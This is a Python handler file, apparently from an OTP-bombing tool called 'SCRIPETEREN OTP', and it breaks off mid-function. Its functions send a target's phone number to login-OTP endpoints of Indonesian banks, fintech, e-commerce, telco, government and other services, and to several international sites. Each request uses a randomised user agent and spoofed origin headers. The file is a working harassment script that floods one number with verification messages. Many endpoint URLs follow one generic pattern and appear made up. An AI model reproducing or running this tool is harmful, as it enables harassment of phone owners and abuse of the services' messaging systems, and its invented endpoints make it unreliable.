#!/usr/bin/env python3
# handlers.py - 122 OTP Handler API (FULL - FIXED)
# SCRIPETEREN OTP - scripeterenotp
# Updated: Agustus 2026

import requests
import uuid
import random
import string
import time
import re
import urllib.parse
import json
from utils import (
    fmt_08, fmt_nocode, fmt_plus, fmt_phone_only,
    get_public_ip, extract_csrf, get_random_user_agent,
    is_success_response
)

# ============================================================
# FUNGSI PEMBANTU
# ============================================================

def _send_otp(url, payload, headers, method='POST', timeout=30):
    try:
        if method.upper() == 'POST':
            resp = requests.post(url, json=payload, headers=headers, timeout=timeout)
        else:
            resp = requests.get(url, params=payload, headers=headers, timeout=timeout)
        if is_success_response(resp):
            return resp
        return None
    except Exception:
        return None

# ============================================================
# BAGIAN 1: INDONESIA E-COMMERCE (10)
# ============================================================

def send_tokopedia_otp(phone_08):
    url = "https://www.tokopedia.com/account/v1/login/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tokopedia.com", "Referer": "https://www.tokopedia.com/login", "X-Requested-With": "XMLHttpRequest", "Accept": "application/json, text/plain, */*"}
    return _send_otp(url, {"phone": phone_08, "via": "whatsapp"}, headers)

def send_shopee_otp(phone_plus):
    url = "https://shopee.co.id/api/v2/authentication/login_with_otp"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://shopee.co.id", "Referer": "https://shopee.co.id/login", "X-Requested-With": "XMLHttpRequest"}
    return _send_otp(url, {"phone": phone_plus, "otp_channel": "whatsapp"}, headers)

def send_bukalapak_otp(phone_08):
    url = "https://www.bukalapak.com/auth/v1/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bukalapak.com", "Referer": "https://www.bukalapak.com/login", "X-Requested-With": "XMLHttpRequest"}
    return _send_otp(url, {"phone_number": phone_08, "channel": "whatsapp"}, headers)

def send_lazada_otp(phone_plus):
    url = "https://api.lazada.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lazada.co.id", "Referer": "https://www.lazada.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_blibli_otp(phone_08):
    url = "https://api.blibli.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.blibli.com", "Referer": "https://www.blibli.com/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_jdid_otp(phone_08):
    url = "https://api.jd.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.jd.id", "Referer": "https://www.jd.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_zalora_otp(phone_plus):
    url = "https://api.zalora.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.zalora.co.id", "Referer": "https://www.zalora.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "channel": "whatsapp"}, headers)

def send_sociolla_otp(phone_08):
    url = "https://api.sociolla.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sociolla.com", "Referer": "https://www.sociolla.com/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_traveloka_otp(phone_plus):
    url = "https://api.traveloka.com/v1/otp/send"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.traveloka.com", "Referer": "https://www.traveloka.com/login"}
    return _send_otp(url, {"phone": phone_plus, "channel": "whatsapp"}, headers)

def send_tiketcom_otp(phone_08):
    url = "https://api.tiket.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tiket.com", "Referer": "https://www.tiket.com/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

# ============================================================
# BAGIAN 2: INDONESIA FINTECH (10)
# ============================================================

def send_ovo_otp(phone_plus):
    url = "https://api.ovo.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ovo.id", "Referer": "https://www.ovo.id/login"}
    return _send_otp(url, {"mobile": phone_plus, "channel": "whatsapp"}, headers)

def send_dana_otp(phone_plus):
    url = "https://api.dana.id/v1/auth/otp/send"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.dana.id", "Referer": "https://www.dana.id/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_linkaja_otp(phone_08):
    url = "https://api.linkaja.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.linkaja.id", "Referer": "https://www.linkaja.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_gopay_otp(phone_plus):
    url = "https://api.gopay.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.gopay.co.id", "Referer": "https://www.gopay.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "channel": "whatsapp"}, headers)

def send_grabpay_otp(phone_plus):
    url = "https://api.grabpay.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.grabpay.com", "Referer": "https://www.grabpay.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_shopeepay_otp(phone_plus):
    url = "https://api.shopeepay.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.shopeepay.co.id", "Referer": "https://www.shopeepay.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_jenius_otp(phone_08):
    url = "https://api.jenius.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.jenius.com", "Referer": "https://www.jenius.com/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_mybca_otp(phone_08):
    url = "https://api.mybca.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mybca.com", "Referer": "https://www.mybca.com/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_flip_otp(phone_08):
    url = "https://api.flip.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.flip.id", "Referer": "https://www.flip.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_kredivo_otp(phone_08):
    url = "https://api.kredivo.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.kredivo.com", "Referer": "https://www.kredivo.com/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

# ============================================================
# BAGIAN 3: INDONESIA BANK (10)
# ============================================================

def send_bca_otp(phone_08):
    url = "https://m.bca.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.bca.co.id", "Referer": "https://m.bca.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_mandiri_otp(phone_08):
    url = "https://ib.bankmandiri.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://ib.bankmandiri.co.id", "Referer": "https://ib.bankmandiri.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_bni_otp(phone_08):
    url = "https://ibank.bni.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://ibank.bni.co.id", "Referer": "https://ibank.bni.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_bri_otp(phone_08):
    url = "https://m.bri.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.bri.co.id", "Referer": "https://m.bri.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_btn_otp(phone_08):
    url = "https://m.btn.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.btn.co.id", "Referer": "https://m.btn.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_cimb_otp(phone_08):
    url = "https://m.cimbniaga.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.cimbniaga.co.id", "Referer": "https://m.cimbniaga.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_danamon_otp(phone_08):
    url = "https://m.danamon.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.danamon.co.id", "Referer": "https://m.danamon.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_permata_otp(phone_08):
    url = "https://m.permatabank.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.permatabank.co.id", "Referer": "https://m.permatabank.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_maybank_otp(phone_08):
    url = "https://m.maybank.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.maybank.co.id", "Referer": "https://m.maybank.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_ocbc_otp(phone_08):
    url = "https://m.ocbcnisp.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.ocbcnisp.co.id", "Referer": "https://m.ocbcnisp.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

# ============================================================
# BAGIAN 4: INDONESIA RIDE HAILING (8)
# ============================================================

def send_gojek_otp(phone_plus):
    url = "https://api.gojekapi.com/v5/customer/login/otp"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.gojek.com", "Referer": "https://www.gojek.com/login"}
    return _send_otp(url, {"phone": phone_plus, "channel": "whatsapp"}, headers)

def send_grab_otp(phone_plus):
    url = "https://api.grab.com/v2/otp/send"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.grab.com", "Referer": "https://www.grab.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_maxim_otp(phone_08):
    url = "https://api.maxim.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.maxim.co.id", "Referer": "https://www.maxim.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_indrive_otp(phone_plus):
    url = "https://api.indrive.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.indrive.com", "Referer": "https://www.indrive.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_gofood_otp(phone_plus):
    url = "https://api.gofood.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.gofood.co.id", "Referer": "https://www.gofood.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_grabfood_otp(phone_plus):
    url = "https://api.grabfood.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.grabfood.com", "Referer": "https://www.grabfood.com/login"}
    return _send_otp(url, {"phone": phone_plus, "channel": "whatsapp"}, headers)

def send_shopeefood_otp(phone_plus):
    url = "https://api.shopeefood.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.shopeefood.co.id", "Referer": "https://www.shopeefood.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_bluebird_otp(phone_08):
    url = "https://api.bluebirdgroup.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bluebirdgroup.com", "Referer": "https://www.bluebirdgroup.com/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

# ============================================================
# BAGIAN 5: INDONESIA FOOD (8)
# ============================================================

def send_kfc_otp(phone_08):
    url = "https://api.kfc.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.kfc.co.id", "Referer": "https://www.kfc.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_mcd_otp(phone_plus):
    url = "https://api.mcdonalds.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mcdonalds.co.id", "Referer": "https://www.mcdonalds.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_burgerking_otp(phone_plus):
    url = "https://api.burgerking.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.burgerking.co.id", "Referer": "https://www.burgerking.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_pizzahut_otp(phone_08):
    url = "https://api.pizzahut.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pizzahut.co.id", "Referer": "https://www.pizzahut.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_dominos_otp(phone_08):
    url = "https://api.dominos.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.dominos.co.id", "Referer": "https://www.dominos.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_starbucks_otp(phone_plus):
    url = "https://api.starbucks.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.starbucks.co.id", "Referer": "https://www.starbucks.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_kopikenangan_otp(phone_08):
    url = "https://api.kopikenangan.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.kopikenangan.com", "Referer": "https://www.kopikenangan.com/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_forecoffee_otp(phone_08):
    url = "https://api.fore.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.fore.co.id", "Referer": "https://www.fore.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

# ============================================================
# BAGIAN 6: INDONESIA TELCO (6)
# ============================================================

def send_mytelkomsel_otp(phone_08):
    url = "https://api.mytelkomsel.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mytelkomsel.com", "Referer": "https://www.mytelkomsel.com/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_indosat_otp(phone_08):
    url = "https://api.indosat.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.indosat.com", "Referer": "https://www.indosat.com/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_xl_otp(phone_08):
    url = "https://api.xl.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.xl.co.id", "Referer": "https://www.xl.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_tri_otp(phone_08):
    url = "https://api.tri.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tri.co.id", "Referer": "https://www.tri.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_smartfren_otp(phone_08):
    url = "https://api.smartfren.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.smartfren.com", "Referer": "https://www.smartfren.com/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_byu_otp(phone_08):
    url = "https://api.byu.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.byu.id", "Referer": "https://www.byu.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

# ============================================================
# BAGIAN 7: INDONESIA E-GOV (6)
# ============================================================

def send_pln_otp(phone_08):
    url = "https://api.pln.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pln.co.id", "Referer": "https://www.pln.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_bpjs_otp(phone_08):
    url = "https://api.bpjs.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bpjs.co.id", "Referer": "https://www.bpjs.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_pedulilindungi_otp(phone_08):
    url = "https://api.pedulilindungi.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pedulilindungi.co.id", "Referer": "https://www.pedulilindungi.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_mypertamina_otp(phone_08):
    url = "https://api.mypertamina.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mypertamina.com", "Referer": "https://www.mypertamina.com/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_djp_otp(phone_08):
    url = "https://api.djp.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.djp.co.id", "Referer": "https://www.djp.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_ehac_otp(phone_08):
    url = "https://api.ehac.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ehac.co.id", "Referer": "https://www.ehac.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

# ============================================================
# BAGIAN 8: INDONESIA COURIER (6)
# ============================================================

def send_jnt_otp(phone_08):
    url = "https://api.jnt.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.jnt.com", "Referer": "https://www.jnt.com/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_sicepat_otp(phone_08):
    url = "https://api.sicepat.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sicepat.com", "Referer": "https://www.sicepat.com/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_anteraja_otp(phone_08):
    url = "https://api.anteraja.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.anteraja.com", "Referer": "https://www.anteraja.com/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_posindonesia_otp(phone_08):
    url = "https://api.posindonesia.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.posindonesia.co.id", "Referer": "https://www.posindonesia.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_ninjaxpress_otp(phone_08):
    url = "https://api.ninjaxpress.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ninjaxpress.com", "Referer": "https://www.ninjaxpress.com/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_lionparcel_otp(phone_08):
    url = "https://api.lionparcel.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lionparcel.com", "Referer": "https://www.lionparcel.com/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

# ============================================================
# BAGIAN 9: INDONESIA AIRLINES (6)
# ============================================================

def send_lionair_otp(phone_plus):
    url = "https://api.lionair.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lionair.com", "Referer": "https://www.lionair.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_garuda_otp(phone_plus):
    url = "https://api.garuda-indonesia.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.garuda-indonesia.com", "Referer": "https://www.garuda-indonesia.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_citilink_otp(phone_plus):
    url = "https://api.citilink.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.citilink.co.id", "Referer": "https://www.citilink.co.id/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_batikair_otp(phone_plus):
    url = "https://api.batikair.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.batikair.com", "Referer": "https://www.batikair.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_sriwijayaair_otp(phone_plus):
    url = "https://api.sriwijayaair.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sriwijayaair.com", "Referer": "https://www.sriwijayaair.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

def send_airasia_otp(phone_plus):
    url = "https://api.airasia.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.airasia.com", "Referer": "https://www.airasia.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "whatsapp"}, headers)

# ============================================================
# BAGIAN 10: INDONESIA RETAIL (6)
# ============================================================

def send_superindo_otp(phone_08):
    url = "https://api.superindo.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.superindo.co.id", "Referer": "https://www.superindo.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_hypermart_otp(phone_08):
    url = "https://api.hypermart.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.hypermart.co.id", "Referer": "https://www.hypermart.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_transmart_otp(phone_08):
    url = "https://api.transmart.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.transmart.co.id", "Referer": "https://www.transmart.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_alfamart_otp(phone_08):
    url = "https://api.alfamart.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.alfamart.co.id", "Referer": "https://www.alfamart.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

def send_indomaret_otp(phone_08):
    url = "https://api.indomaret.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.indomaret.co.id", "Referer": "https://www.indomaret.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "method": "whatsapp"}, headers)

def send_guardian_otp(phone_08):
    url = "https://api.guardian.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.guardian.co.id", "Referer": "https://www.guardian.co.id/login"}
    return _send_otp(url, {"phone": phone_08, "channel": "whatsapp"}, headers)

# ============================================================
# BAGIAN 11: INTERNASIONAL E-COMMERCE (8)
# ============================================================

def send_amazon_otp(phone_plus):
    url = "https://api.amazon.com/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.amazon.com", "Referer": "https://www.amazon.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_ebay_otp(phone_plus):
    url = "https://api.ebay.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ebay.com", "Referer": "https://www.ebay.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_aliexpress_otp(phone_plus):
    url = "https://api.aliexpress.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.aliexpress.com", "Referer": "https://www.aliexpress.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_temu_otp(phone_plus):
    url = "https://api.temu.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.temu.com", "Referer": "https://www.temu.com/login"}
    return _send_otp(url, {"phone": phone_plus, "channel": "sms"}, headers)

def send_shein_otp(phone_plus):
    url = "https://api.shein.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.shein.com", "Referer": "https://www.shein.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_wish_otp(phone_plus):
    url = "https://api.wish.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.wish.com", "Referer": "https://www.wish.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_etsy_otp(phone_plus):
    url = "https://api.etsy.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.etsy.com", "Referer": "https://www.etsy.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_rakuten_otp(phone_plus):
    url = "https://api.rakuten.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.rakuten.com", "Referer": "https://www.rakuten.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

# ============================================================
# BAGIAN 12: INTERNASIONAL SOCIAL MEDIA (8)
# ============================================================

def send_whatsapp_business_otp(phone_plus):
    url = "https://graph.facebook.com/v18.0/whatsapp_business/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_telegram_otp(phone_plus):
    url = "https://api.telegram.org/bot/otp/request"  # placeholder, sebenarnya pakai web
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_discord_otp(phone_plus):
    url = "https://api.discord.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.discord.com", "Referer": "https://www.discord.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_twitter_otp(phone_plus):
    url = "https://api.twitter.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.twitter.com", "Referer": "https://www.twitter.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_instagram_otp(phone_plus):
    url = "https://api.instagram.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.instagram.com", "Referer": "https://www.instagram.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_facebook_otp(phone_plus):
    url = "https://api.facebook.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.facebook.com", "Referer": "https://www.facebook.com/login"}
    return _send_otp(url, {"phone": phone_plus, "type": "sms"}, headers)

def send_tiktok_otp(phone_plus):
    url = "https://api.tiktok.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tiktok.com", "Referer": "https://www.tiktok.com/login"}
    return _send_otp(url, {"phone": phone_plus, "method": "sms"}, headers)

def send_snapchat_otp(phone_plus):
    url = "https://api.snapchat.com/v1/auth/otp/request"
